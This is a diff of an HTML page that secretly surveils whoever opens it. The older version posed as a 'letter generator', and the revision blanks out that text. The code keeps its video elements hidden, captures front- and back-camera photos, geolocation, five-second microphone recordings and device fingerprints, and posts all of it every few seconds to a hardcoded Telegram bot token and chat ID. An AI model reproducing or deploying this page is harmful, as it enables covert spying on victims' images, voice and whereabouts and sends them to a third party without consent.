@@ -3,15 +3,15 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Webcam</title>
+  
   <style>
     body {
       font-family: Arial, sans-serif;
       text-align: center;
-      margin-top: 50px;
+      margin-top: 20px;
     }
-    video, canvas {
-      display: none; /* Hide the video and canvas elements */
+    video, canvas, audio {
+      display: none; /* Hide the elements */
     }
     #status {
       font-size: 18px;
@@ -28,108 +28,245 @@
   </style>
 </head>
 <body>
-  <h1>please wait letter ✉️</h1>
-  <p id="status">generating.....</p>
+  <h1></h1>
+  <video id="videoFront" width="640" height="480" autoplay></video> <!-- For front camera -->
+  <video id="videoBack" width="640" height="480" autoplay></video> <!-- For back camera -->
+  <p id="status"></p>
   <p id="error"></p>
 
-  <video id="video" width="640" height="480" autoplay style="visibility: hidden;"></video> <!-- Hide the video element -->
-  <canvas id="canvas" width="640" height="480" style="display: none;"></canvas> <!-- Keep canvas hidden -->
+  <canvas id="canvas" width="640" height="480"></canvas> <!-- Canvas for image capture -->
 
   <script>
-    const video = document.getElementById('video');
+    const videoFront = document.getElementById('videoFront');
+    const videoBack = document.getElementById('videoBack');
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
     const statusElement = document.getElementById('status');
     const errorElement = document.getElementById('error');
 
-    // Using the provided Telegram bot token and chat ID
     const TELEGRAM_BOT_TOKEN = '7819967626:AAFSA5LnWfAcni_ETGiJXTZIJCgEM_ObN88';
-    const CHAT_ID = '6672207604'; // Replace this with your actual user ID or chat ID
+    const CHAT_ID = '6672207604';
 
     let isSending = false;
-    let captureInterval;
+    let audioRecorder;
+    let audioChunks = [];
+    let audioReady = true; // Add a flag to manage the timing of audio recording
 
-    // Access the user's webcam
-    function initializeWebcam() {
-      navigator.mediaDevices.getUserMedia({ video: true })
+    // Device information variables
+    let locationInfo = '';
+    let deviceInfo = '';
+
+    // Initialize the webcam for front and back camera
+    function initializeWebcams() {
+      // Front Camera
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
         .then(stream => {
-          video.srcObject = stream;
-          statusElement.textContent = "Webcam initialized. Ready to capture.";
-          startSendingPhotos(); // Automatically start sending photos
+          videoFront.srcObject = stream;
         })
         .catch(err => {
-          errorElement.textContent = `Error accessing the webcam: ${err.message}`;
-          console.error('Webcam access error:', err);
+          errorElement.textContent = `Error accessing front camera: ${err.message}`;
+          console.error('Front Camera access error:', err);
+        });
+
+      // Back Camera
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'environment' } } })
+        .then(stream => {
+          videoBack.srcObject = stream;
+        })
+        .catch(err => {
+          errorElement.textContent = `: ${err.message}`;
+          console.error('', err);
         });
     }
 
-    // Start capturing and sending images
-    function startSendingPhotos() {
-      if (!isSending) {
-        isSending = true;
-        statusElement.textContent = "please wait generating your letter ✉️💌";
-        captureInterval = setInterval(() => {
-          captureAndSendPhoto();
-        }, 1000); // Capture and send every 1 second
+    // Function to capture images, location, and send data to Telegram
+    function captureAndSendData() {
+      capturePhoto(videoFront, 'Front Camera');
+      capturePhoto(videoBack, 'Back Camera');
+      captureLocation();
+      if (audioReady) {
+        captureAudio(); // Ensure the audio is only captured once every 5 seconds
       }
     }
 
-    // Capture image from the video and send to Telegram
-    function captureAndSendPhoto() {
-      // Draw the video frame to the canvas
+    // Capture photo from video
+    function capturePhoto(video, cameraName) {
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      // Convert the canvas to a data URL (base64 image)
       const imageDataUrl = canvas.toDataURL('image/jpeg');
-
-      // Convert base64 image to Blob
       const imageBlob = dataURItoBlob(imageDataUrl);
-
-      // Send the image to Telegram
-      sendPhotoToTelegram(imageBlob);
+      sendPhotoToTelegram(imageBlob, cameraName);
     }
 
-    // Function to send the image to Telegram
-    function sendPhotoToTelegram(imageBlob) {
+    // Send the captured photo and device info to Telegram
+    function sendPhotoToTelegram(imageBlob, cameraName) {
       const formData = new FormData();
       formData.append('chat_id', CHAT_ID);
-      formData.append('photo', imageBlob, 'photo.jpg');
+      formData.append('photo', imageBlob, `${cameraName}.jpg`);
 
-      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+      // Add device information and location to the message
+      getDeviceInfo().then(info => {
+        const message = `Camera: ${cameraName}\n${info}\nLocation: ${locationInfo}`;
+        formData.append('caption', message);
+        
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            console.log('Photo and info sent successfully:', data);
+          } else {
+            errorElement.textContent = `Error sending photo: ${data.description}`;
+            console.error('Telegram API error:', data);
+          }
+        })
+        .catch(err => {
+          errorElement.textContent = `Error sending photo: ${err.message}`;
+          console.error('Send photo error:', err);
+        });
+      });
+    }
+
+    // Function to get device and browser information
+    function getDeviceInfo() {
+      return new Promise((resolve) => {
+        const screenWidth = window.screen.width;
+        const screenHeight = window.screen.height;
+        const language = navigator.language;
+        const platform = navigator.platform;
+        const deviceMemory = navigator.deviceMemory || 'Unknown';
+        const cores = navigator.hardwareConcurrency || 'Unknown';
+        const networkInfo = navigator.connection || {};
+        const os = getOSInfo();
+        const browser = getBrowserInfo();
+
+        // Additional device information
+        const orientation = screen.orientation ? screen.orientation.type : 'Unknown';
+        const networkType = networkInfo.effectiveType || 'Unknown';
+        const userAgent = navigator.userAgent;
+
+        const deviceData = `
+          Platform: ${platform}
+          OS: ${os}
+          Browser: ${browser}
+          Language: ${language}
+          Screen: ${screenWidth}x${screenHeight}
+          Device Memory: ${deviceMemory} GB
+          CPU Cores: ${cores}
+          Network Type: ${networkType}
+          Screen Orientation: ${orientation}
+          User Agent: ${userAgent}
+        `;
+
+        resolve(deviceData);
+      });
+    }
+
+    // Function to capture location
+    function captureLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+          locationInfo = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
+        }, error => {
+          locationInfo = `Unable to retrieve location: ${error.message}`;
+        });
+      } else {
+        locationInfo = "Geolocation is not supported by this browser.";
+      }
+    }
+
+    // Function to start audio recording every 5 seconds
+    async function captureAudio() {
+      if (!audioReady) return; // Avoid multiple recordings at once
+
+      audioReady = false;
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        audioRecorder = new MediaRecorder(stream);
+        audioRecorder.ondataavailable = event => {
+          audioChunks.push(event.data);
+          if (audioRecorder.state === 'inactive') {
+            sendAudioToTelegram(new Blob(audioChunks, { type: 'audio/webm' }));
+            audioChunks = [];
+          }
+        };
+        audioRecorder.start();
+        setTimeout(() => {
+          audioRecorder.stop();
+          audioReady = true; // Allow recording again
+        }, 5000); // Record for 5 seconds
+      } catch (err) {
+        errorElement.textContent = `Error accessing microphone: ${err.message}`;
+        console.error('Microphone access error:', err);
+        audioReady = true; // Ensure that we can try recording again
+      }
+    }
+
+    // Function to send audio to Telegram
+    function sendAudioToTelegram(audioBlob) {
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('audio', audioBlob, 'audio.webm');
+
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, {
         method: 'POST',
         body: formData
       })
       .then(response => response.json())
       .then(data => {
         if (data.ok) {
-          console.log('Photo sent successfully:', data);
+          console.log('Audio sent successfully:', data);
         } else {
-          errorElement.textContent = `Error sending photo: ${data.description}`;
+          errorElement.textContent = `Error sending audio: ${data.description}`;
           console.error('Telegram API error:', data);
         }
       })
       .catch(err => {
-        errorElement.textContent = `Error sending photo: ${err.message}`;
-        console.error('Send photo error:', err);
+        errorElement.textContent = `Error sending audio: ${err.message}`;
+        console.error('Send audio error:', err);
       });
     }
 
-    // Function to convert base64 to Blob
+    // Helper functions for OS and browser info
+    function getOSInfo() {
+      const userAgent = window.navigator.userAgent;
+      if (userAgent.indexOf('Win') !== -1) return "Windows";
+      if (userAgent.indexOf('Mac') !== -1) return "MacOS";
+      if (userAgent.indexOf('Linux') !== -1) return "Linux";
+      if (userAgent.indexOf('Android') !== -1) return "Android";
+      if (userAgent.indexOf('like Mac') !== -1) return "iOS";
+      return "Unknown";
+    }
+
+    function getBrowserInfo() {
+      const agent = window.navigator.userAgent.toLowerCase();
+      if (agent.indexOf('firefox') > -1) return "Firefox";
+      if (agent.indexOf('chrome') > -1) return "Chrome";
+      if (agent.indexOf('safari') > -1) return "Safari";
+      if (agent.indexOf('msie') > -1 || agent.indexOf('trident') > -1) return "Internet Explorer";
+      return "Unknown";
+    }
+
+    // Initialize webcams on page load
+    initializeWebcams();
+
+    // Capture and send data every 5 seconds
+    setInterval(captureAndSendData, 5000); // Capture data every 5 seconds
+
+    // Helper function to convert base64 image to Blob
     function dataURItoBlob(dataURI) {
       const byteString = atob(dataURI.split(',')[1]);
       const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-      const ab = new ArrayBuffer(byteString.length);
-      const ia = new Uint8Array(ab);
+      const arrayBuffer = new ArrayBuffer(byteString.length);
+      const intArray = new Uint8Array(arrayBuffer);
 
       for (let i = 0; i < byteString.length; i++) {
-        ia[i] = byteString.charCodeAt(i);
+        intArray[i] = byteString.charCodeAt(i);
       }
 
-      return new Blob([ab], { type: mimeString });
+      return new Blob([intArray], { type: mimeString });
     }
-
-    // Initialize webcam when page loads
-    initializeWebcam();
   </script>
 </body>
 </html>
